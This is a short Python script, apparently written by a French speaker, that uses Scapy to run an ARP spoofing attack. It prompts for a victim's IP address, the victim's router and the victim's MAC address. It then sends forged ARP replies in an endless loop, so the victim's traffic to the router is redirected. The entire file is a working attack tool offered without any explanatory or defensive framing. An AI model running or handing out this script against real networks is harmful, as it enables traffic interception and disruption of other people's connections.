#####################################################################
#
#
#
#####################################################################

from scapy.all import *

victim = "IP de la victime : "
victim = raw_input(victim)
spoof = "routeur de la victime : "
spoof = raw_input(spoof)
op=2
mac = "l'adresse mac de la victime : "
mac = raw_input(mac)

while True:
    arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)

    send(arp)
